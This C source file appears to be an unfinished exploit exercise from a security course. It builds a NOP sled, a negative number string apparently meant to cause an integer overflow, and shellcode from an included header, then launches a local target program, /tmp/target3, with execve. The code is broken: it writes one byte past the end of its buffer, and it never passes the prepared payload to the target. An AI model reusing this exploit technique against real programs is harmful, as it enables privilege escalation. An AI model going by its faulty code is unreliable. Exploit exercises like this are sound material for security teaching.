#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack[3230];
  char *num="-153391488";
  char *in="-153391489";
  int i;
  for(i=0;i<sizeof(attack)-1;i++)
  {
    attack[i]=0x90;
  }
  for(i=0;i<10;i++)
  {
    attack[i]=num[i];
  }
  attack[10]=',';
  for(i=0;i<sizeof(shellcode)-1;i++)
  {
    attack[12+i]=shellcode[i];
  }
  attack[3230]='\0';
  //memcpy(in,num,sizeof(num));
  printf("HAHA\n");
  args[0] = TARGET; args[1] = "50,HAHA"; args[2] = NULL;
  env[0] = NULL;
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  
  return 0;
}
